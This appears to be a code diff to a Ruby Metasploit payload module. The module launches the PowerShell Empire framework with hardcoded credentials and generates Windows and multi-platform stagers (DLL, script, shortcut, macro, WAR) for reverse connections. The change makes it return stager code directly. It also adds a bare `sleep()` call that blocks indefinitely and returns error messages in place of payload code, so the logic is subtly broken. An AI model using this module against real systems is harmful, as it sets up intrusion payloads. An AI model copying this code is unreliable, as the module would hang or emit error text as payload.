@@ -8,6 +8,9 @@ require 'msf/core/module/options'
 require 'msf/core/empire_lib.rb'
 
 module MetasploitModule
+
+  CachedSize = 387
+
   include Msf::Empire
   include Msf::Module::Options
   include Msf::Module::DataStore
@@ -50,31 +53,6 @@ module MetasploitModule
         '/'])
     ])
   end
-  def payload_name(stager)
-    @rand_no = rand(1..10000)
-    case stager
-      when "windows/dll"
-        return "/tmp/launcher#{@rand_no}.dll"
-      when "windows/launcher_bat"
-        return "/tmp/launcher#{@rand_no}.bat"
-      when "windows/launcher_vbs"
-        return "/tmp/launcher#{@rand_no}.vbs"
-      when "windows/launcher_sct"
-        return "/tmp/launcher#{@rand_no}.sct"
-      when "windows/launcher_lnk"
-        return "/tmp/launcher#{@rand_no}.lnk"
-      when "windows/launcher_xml"
-        return "/tmp/launcher#{@rand_no}.xml"
-      when "windows/teensy"
-        return "/tmp/launcher#{@rand_no}.ino"
-      when "windows/macro"
-        return "/tmp/macro#{@rand_no}.txt"
-      when "multi/pyinstaller"
-        return "/tmp/launcher#{@rand_no}.elf"
-      when "multi/war"
-        return "/tmp/launcher#{@rand_no}.war"
-    end
-  end
 
   def generate
     #
@@ -91,7 +69,7 @@ module MetasploitModule
       #Initiating the Empire API Instance thread
       #
       if not File.file?('empire.sh')
-        return ""
+        return "Invalid directory"
       end
       command = "./empire.sh --headless --username 'empire-msf' --password 'empire-msf' > /dev/null"
       print_status("Initiating Empire Web-API")
@@ -102,8 +80,10 @@ module MetasploitModule
       #Check port
       command = "netstat -nlt | grep 1337"
       if not system(command)
-        return ""
+        return "Empire-API not yet active"
       end
+      #Assign proper time interval so that the API can initiate
+      sleep()
       #Creating an Empire object
       client_emp = Msf::Empire::Client.new('empire-msf','empire-msf')
       #Checking listener status
@@ -116,23 +96,14 @@ module MetasploitModule
         print_status(response)
       end
 
-      #Creating the stager
-      payload_path = payload_name(@stager_type)
-
       #Generating payload
       if @stager_type == "windows/dll"
-        print_status(client_emp.generate_dll(@listener_name, payload_path, 'x64', @path))
+        stagerCode = client_emp.generate_dll(@listener_name, 'x86',@path)
+        return stagerCode
       else
-        print_status(client_emp.gen_stager(@listener_name, @stager_type, payload_path))
+        stagerCode = client_emp.gen_stager(@listener_name, @stager_type)
+        return stagerCode
       end
-
-      #Shutting down API
-      client_emp.shutdown()
-
-      #Showing user the respective listener name to use while handling for
-      #reverse connections
-      print_status("Use Listener : #{@listener_name} to listen for the created stager")
-
     end
 
     #Commencing the threads
@@ -147,3 +118,4 @@ module MetasploitModule
     thread_main.join
   end
 end
+
